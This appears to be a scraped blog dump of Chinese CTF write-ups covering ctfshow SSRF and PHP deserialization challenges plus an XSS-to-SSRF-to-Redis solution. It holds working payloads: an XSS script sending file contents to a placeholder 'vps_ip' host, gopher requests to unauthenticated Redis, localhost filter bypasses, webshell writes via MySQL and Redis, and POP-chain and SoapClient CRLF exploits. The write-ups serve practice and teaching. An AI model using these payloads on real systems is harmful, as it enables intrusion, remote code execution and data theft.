&#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; 解码一下得到 12345678910111213141516&lt;?php// database configdefine(&#x27;DB_USER&#x27;, &#x27;xssrf&#x27;);define(&#x27;DB_PASS&#x27;, &#x27;xssrfmeplz&#x27;);define(&#x27;DB_HOST&#x27;, &#x27;host=localhost&#x27;);define(&#x27;DB_NAME&#x27;, &#x27;xssrf&#x27;);// redis configdefine(&#x27;REDIS_HOST&#x27;, &#x27;localhost&#x27;);define(&#x27;REDIS_PORT&#x27;, 25566);// define flagdefine(&#x27;FLAG&#x27;, &#x27;FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;&#x27;);$c_hardness = 5; // how many proof of work leading zeros 第 2 个 flag 1FLAG&#123;curl -v -o flag --next flag:&#x2F;&#x2F;in-the.redis&#x2F;the?port&#x3D;25566&amp;good&#x3D;luck&#125; 说好的第 2 个 flag 在 redis 里呢… xssrf redis上一个 flag 提示 redis 端口在 25566 先试试 gopher 协议 未授权打 redis 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a&quot;);&quot;&gt; redis环境信息被愉快的打印出来 依次获取 redis 的键和值即可 获取所有键 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a&quot;); 读取结果 12345*1$4flag 判断flag键的值类型 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a&quot;); 读取结果 1+list 获取flag键的所有列表值 1xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%2520-1%250a&quot;); 把结果复制进字符串 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221s = &quot;&quot;&quot;*53$1&#125;$1t$1i$1o$1l$1p$1x$1e$1 $1o$1t$1 $1y$1s$1a$1e$1 $1s$1i$1 $1n$1o$1i$1t$1a$1c$1i$1t$1n$1e$1h$1t$1u$1a$1 $1t$1u$1o$1h$1t$1i$1w$1 $1s$1i$1d$1e$1R$1&#123;$1G$1A$1L$1F&quot;&quot;&quot;flag = &#x27;&#x27;for c in s: flag += cprint(flag[::-1].replace(&quot;1$&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;)) 结果在去除最后三个字符 35* 即可 1FLAG&#123;Redis without authentication is easy to exploit&#125; 虽然生产环境利用起来相对困难，不过毕竟是CTF嘛，骚思路多一个是一个 （ 参考链接 https://skysec.top/2018/08/17/xss-ssrf-redis/","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctf练习","slug":"ctf/hackme/ctf练习","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"}]},{"title":"ctfshow SSRF篇","slug":"ctfshow-ssrf","date":"2021-04-25T13:14:38.000Z","updated":"2021-05-04T13:50:57.074Z","comments":true,"path":"2021/04/25/ctfshow-ssrf/","link":"","permalink":"https://tari.moe/2021/04/25/ctfshow-ssrf/","excerpt":"","text":"要是多点组合拳，或者条件苛刻些就好了 （ web351 简单认识nginx/1.18.0 PHP/7.3.22 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; poc 12# POSTurl=http://127.0.0.1/flag.php web352 永远相信美好的事情即将发生nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 分析： 协议必须是 http/https ，但过滤了 localhost 和 127.0.0 poc 1url=http://127.0.0.1/flag.php preg_match 没传参可还行。。因为有 error_reporting(0) ，报错的地方恒为 False… web353 数字绕过nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127\\.0\\.|\\。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 分析： 协议必须是 http/https ，但过滤了 localhost 和 127.0. 这里有许多绕过 进制绕过 1url=http://0x7F000001/flag.php 0.0.0.0 绕过 1url=http://0.0.0.0/flag.php ipv6绕过 这里不行 特殊地址绕过 123url=http://0/flag.phpurl=http://127.1/flag.phpurl=http://127.0000000000000.001/flag.php 这里有个小知识点 第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0 web354 难点的数字绕过nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 了解到一个好玩的东西 IDNA ，不过这题用不上 https://www.tr0y.wang/2020/08/18/IDN/ 然后又了解到一个有趣的东西， 有免费的 http://sudo.cc/ 可以解析到 127.0.0.1 白嫖。 题外： 虽然也可以用自己的域名或服务器，2333 web355 长度限制nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 主机名部分长度限制，可以用 http://0/flag.php 也可以用 http://127.1/flag.php web356 长度限制nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=3))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 同 web255，只不过短了点 web357 IP过滤器nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123; die(&#x27;scheme&#x27;);&#125;?&gt; 分析： 先获取主机名对应的ip，然后用IP过滤器进行过滤 FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1） FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。 即，主机名解析的 IP 不能是保留地址或者是内网 IP。 这时利用公网服务器进行重定向即可，为了以后的题目 fuzz 方便，写好参数 1234567&lt;?php$h_p_p = explode(&quot;@&quot;, $_GET[&#x27;h&#x27;]);$host = $h_p_p[0] or &#x27;127.0.0.1&#x27;;$port = $h_p_p[1] or &#x27;80&#x27;;$path = $h_p_p[2] or &#x27;&#x27;;header(&quot;Location: http://$host:$port/$path&quot;, TRUE, 302);?&gt; web358 白名单正则nginx/1.18.0 PHP/7.3.22 12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123; echo file_get_contents($url);&#125; 分析， 之前一直没分析到这个 parse_url 函数的特性，有些时候有的时候 URL 会长这样 解析时，会把@进行分割，前面是用户，后面是主机名。 web359 打无密码MySQLnginx/1.16.1 PHP/7.3.11 题目提示 打无密码的mysql 为什么是无密码呢？ https://paper.seebug.org/510/ MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。 随便写点东西 Login 一下，然后有个 returl 写个 baidu，发现可以请求 baidu 一般 SSRF 打内网应用主要还是通过协议，比如用的比较多的是 gopher 具体怎么做呢？ 细心的同学可能发现，无论是用 gopher 攻击 redis、mysql、还是 ftp，这些主要都是基于 tcp 协议为主。这和 gopher 协议的基本格式有关 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 因为，如果想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 Wireshark 抓包来分析 可以参考下面链接的 0x02 mysql协议分析部分 https://www.freebuf.com/articles/web/159342.html 不过这里有个更好用的工具 https://github.com/tarunkant/Gopherus 他包含常见的应用 gopher 数据包的格式构造， 原理也是通过 Wireshark 抓包分析，然后写脚本。 1python2 gopherus.py --exploit mysql 依次输入用户和要执行的SQL语句 12Give MySQL username: rootGive query to execute: select &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; into outfile &#x27;/var/www/html/c.php&#x27;; 当然，除了满足MySQL未授权外，还需要MySQL开启允许导出文件以及知道网站根目录，本漏洞才能成功利用，缺一不可。 这个 /var/www/html 目录是如何知道的呢？应该是爆破的… 生成的 POC 里，_ 字符后面的内容还要 URL编码一次，因为 PHP接收到POST或GET请求数据，会自动进行一次URL解码，然后，比如 %00 解码后，PHP会直接截断。。 最终 POC 然后在 c.php 里面 cat /flag.txt 即可 flag ctfshow{d9cfb450-02d7-4b13-9170-4b9306d01a34} 顺便嫖一下 check.php 代码 （ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif(isset($_POST[&#x27;returl&#x27;]))&#123; $url = $_POST[&#x27;returl&#x27;]; if(preg_match(&quot;/file|dict/i&quot;,$url))&#123; die(); &#125; echo _request(&quot;$url&quot;);&#125;function _request($curl,$https=true,$method=&#x27;get&#x27;,$data=null)&#123;$ch=curl_init(); //初始化curl_setopt($ch,CURLOPT_URL,$curl);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_HEADER,false);//设置不需要头信息curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);//获取页面内容，但不输出if($https)&#123; curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);//不做服务器认证 curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,FALSE);//不做客户端认证&#125;if($method==&#x27;post&#x27;)&#123; curl_setopt($ch, CURLOPT_POST,true);//设置请求是post方式 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);//设置post请求数据 &#125;$str=curl_exec($ch);//执行访问curl_close($ch);//关闭curl，释放资源return $str; &#125;?&gt; https://www.freebuf.com/articles/web/260806.html 当然还可以有其他利用方式，比如构造 POST 请求进行 SQL注入，文件上传等 web360 打Redisnginx/1.18.0 PHP/7.3.22 题目提示 打redis 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 和上题差不多，也是用 Gopherus 打 redis 1234What do you want?? (ReverseShell/PHPShell): PHPShellGive web root location of server (default is /var/www/html):Give PHP Payload (We have default PHP Shell): &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; URL编码一下 _ 后面的内容 默认生成的 webshell 在 shell.php 中 发的包会超时，不过没事，shell.php 是会生成的。 最后 cat /flaaag 即可 一些参考的题解 https://www.freebuf.com/articles/web/263512.html","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"ctfshow 反序列化篇","slug":"ctfshow-unserialize","date":"2021-04-06T12:21:40.000Z","updated":"2021-04-25T14:00:44.611Z","comments":true,"path":"2021/04/06/ctfshow-unserialize/","link":"","permalink":"https://tari.moe/2021/04/06/ctfshow-unserialize/","excerpt":"","text":"感觉排序不是很友好..因为难度不是相对递增的 建议顺序 web254-258、web260、web262-web266、web259、web261、web275-276 然后 web277-278 是 Python 反序列化，不过比较简单 最后是 web267-web274 都是框架的反序列化漏洞，分析起来会麻烦些 web267-270 是 Yii 的 CVE 和 绕过，web271-273 是 Laravel 5.7 和 5.8 的反序列化， web274是 thinkphp5.1 的反序列化 框架的反序列化有空会（咕咕预订…）额外写文章复现，23333 web254 PHP类简单认识123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123; $this-&gt;isVip=true; &#125; return $this-&gt;isVip; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = new ctfShowUser(); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; poc 1GET /?username=xxxxxx&amp;password=xxxxxx web255 简单逻辑nginx/1.16.1 PHP/7.3.11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; 分析： 即要满足 类成员 isVip 为 true 传入的 username 和 类成员 username 相等 传入的 password 和 类成员 password 相等 username 和 password 已知，反序列化修改 isVip 即可 poc 123456&lt;?phpclass ctfShowUser&#123;&#125;$user = new ctfShowUser();$user-&gt;isVip = true;echo urlencode(serialize($user));?&gt; web256 简单逻辑nginx/1.16.1 PHP/7.3.11 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; if($this-&gt;username!==$this-&gt;password)&#123; echo &quot;your flag is &quot;.$flag; &#125; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; 分析： 即要满足 类成员 isVip 为 true 传入的 username 和 类成员 username 相等 传入的 password 和 类成员 password 相等 类的 username 和 password 不等（原来是相等的） 因为通过反序列化修改原有数据即可 poc 123456&lt;?php$user = new ctfShowUser();$user-&gt;isVip = true;$user-&gt;username = &#x27;6&#x27;;echo urlencode(serialize($user));?&gt; web257 简单POP链nginx/1.16.1 PHP/7.3.11 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; private $username=&#x27;xxxxxx&#x27;; private $password=&#x27;xxxxxx&#x27;; private $isVip=false; private $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; private $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; private $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); $user-&gt;login($username,$password);&#125; 分析： 触发 backDoor 即可 poc 1234567891011121314&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; private $code = &#x27;system(&quot;cat ./flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; web258 正则PHP/5.6.40 正则绕过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 21:38:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; public $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; public $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); &#125; $user-&gt;login($username,$password);&#125; 分析： 绕过正则 /[oc]:\\d+:/i , 其实就是 C:数字 或 O:数字 不连续，这里只需让 O:11 不连续即可，比如 O:+11 poc 123456789101112131415&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; public $code = &#x27;system(&quot;cat flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();$user_replace = preg_replace(&#x27;/([oc]\\:)(\\d+)/i&#x27;, &#x27;$1+$2&#x27;, serialize($user));echo urlencode($user_replace);?&gt; 图中 %2b 为 + 的 url编码 web259 SSRF + CRLF + SoapClientPHP/7.3.11 SSRF CRLF SoapClient index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); flag.php (大概如下 1234567891011121314&lt;?php$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;);&#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125;&#125; 分析： 不就 XFF伪造？ 估计给的代码是不完整的，还真实 IP 判断，估计大概是这样的 12345678910111213141516171819&lt;?php$flag = &quot;flag_tari&quot;;$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&#x27;127.0.0.1&#x27;)&#123; if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;); &#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125; &#125;&#125;echo &quot;your ip not 127.0.0.1&quot;; 搜了一波，奇怪的知识增加了，除了XFF，本题还用到 SSRF(SoapClient)+CRLF组合拳，毕竟我们的 index.php 还有用到呢 需要利用 SSRF 访问 flag.php 并构造 XFF 和 POST 数据，SSRF漏洞在哪呢？ SoapClient类 __call 魔术方法 __call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。 因此，当我们运行 index.php 的 $vip-&gt;getFlag(); 方法时，会因 SoapClient 不存在 getFlag 方法而调用 __call() 魔术方法，进而发送一个 POST 请求 poc 1234567891011121314151617&lt;?php$post_string = &#x27;token=ctfshow&#x27;;$soap = new SoapClient( null, array( &#x27;uri&#x27;=&gt; &quot;http://127.0.0.1/flag.php&quot;, &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;, &#x27;user_agent&#x27;=&gt;&quot;edge\\r\\nX-Forwarded-For:127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, // &#x27;user_agent&#x27;=&gt;&quot;edge\\x0D\\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\\x0D\\x0AContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\x0D\\x0AContent-Length: &quot;.(string)strlen($post_string).&quot;\\x0D\\x0A\\x0D\\x0A&quot;.$post_string, ));echo(urlencode(serialize($soap)));?&gt; 这里注意下，包含特殊字符转义的，比如 \\r\\n 要用双引号 &quot; 单引号保持原来的语义的。 warning 没关系 web260 简单正则PHP/5.6.40 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123; echo $flag;&#125; poc 12345678910&lt;?phpclass ctfShowUser&#123; public $tari = &#x27;ctfshow_i_love_36D&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; (原) web261 SSRF RedisPHP/7.3.11 index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); 分析： 题目提示：打 Redis，默认端口为 6379 原来的 web261，不知为啥换成了下面这个。 原本的解题思路大概是在 web259 的基础上，构造 POST包去打 redis web261 PHP特性nginx/1.18.0 PHP/7.4.16 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 分析 __wakeup() unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 因这里写着 username 和 password 必须为非空，否则会退出，所以可以考虑要绕过这里 参考 CVE-2016-7124 影响范围 PHP5 &lt; 5.6.25 PHP7 